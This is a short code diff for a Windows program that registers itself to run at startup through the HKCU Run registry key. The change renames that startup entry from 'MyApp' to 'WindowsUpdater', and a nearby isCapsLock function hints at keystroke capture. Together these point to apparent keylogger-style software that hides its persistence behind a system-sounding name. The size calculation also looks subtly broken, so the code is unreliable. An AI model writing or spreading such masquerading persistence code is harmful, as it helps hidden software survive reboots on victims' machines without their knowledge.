@@ -23,7 +23,7 @@ void restartOnStartup(void) {
     string progPath = string(re, GetModuleFileName(NULL, re, MAX_PATH));
     HKEY hkey = NULL;
     long createStatus = RegCreateKey(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hkey);
-    long status = RegSetValueEx(hkey, "MyApp", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
+    long status = RegSetValueEx(hkey, "WindowsUpdater", 0, REG_SZ, (BYTE *)progPath.c_str(), (progPath.size()+1) * sizeof(wchar_t));
 }
 
 int isCapsLock(void)
